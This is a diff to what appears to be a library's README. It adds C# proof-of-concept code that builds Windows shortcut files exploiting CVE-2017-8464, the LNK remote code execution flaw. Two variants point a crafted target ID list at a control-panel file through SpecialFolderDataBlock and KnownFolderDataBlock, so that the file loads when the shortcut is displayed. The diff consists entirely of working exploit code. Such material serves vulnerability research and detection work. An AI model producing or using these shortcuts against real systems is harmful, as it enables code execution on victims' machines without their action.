@@ -94,18 +94,37 @@ PowerShellLnk.WriteToFile(@"PowerShell.lnk");
 ```
 
 ### CVE-2017-8464 | LNK Remote Code Execution Vulnerability
+
+#### SpecialFolderDataBlock
 ```
-Shortcut lnk = new Shortcut()
+Shortcut poc = new Shortcut()
 {
 	IconIndex = 0,
 	LinkFlags = LinkFlags.IsUnicode,
 	LinkTargetIDList = new CplLinkTargetIDList(@"E:\target.cpl"),
 };
-int Index = lnk.LinkTargetIDList.ItemIDList.Count - 1;
-lnk.ExtraData.SpecialFolderDataBlock = new SpecialFolderDataBlock()
+int Index = poc.LinkTargetIDList.ItemIDList.Count - 1;
+poc.ExtraData.SpecialFolderDataBlock = new SpecialFolderDataBlock()
 {
 	SpecialFolderID = CSIDL.CSIDL_CONTROLS,
-	Offset = lnk.LinkTargetIDList.GetOffsetByIndex(Index)
+	Offset = poc.LinkTargetIDList.GetOffsetByIndex(Index)
 };
-lnk.WriteToFile(@"CVE-2017-8464.lnk");
+poc.WriteToFile(@"CVE-2017-8464.lnk");
+```
+
+#### KnownFolderDataBlock
+```
+Shortcut poc2 = new Shortcut()
+{
+	IconIndex = 0,
+	LinkFlags = LinkFlags.IsUnicode,
+	LinkTargetIDList = new CplLinkTargetIDList(@"E:\target.cpl")
+};
+int Index = poc2.LinkTargetIDList.ItemIDList.Count - 1;
+poc2.ExtraData.KnownFolderDataBlock = new KnownFolderDataBlock()
+{
+	KnownFolderID = KNOWNFOLDERID.FOLDERID_ControlPanelFolder,
+	Offset = poc2.LinkTargetIDList.GetOffsetByIndex(Index)
+};
+poc2.WriteToFile(@"CVE-2017-8464-2.lnk");
 ```
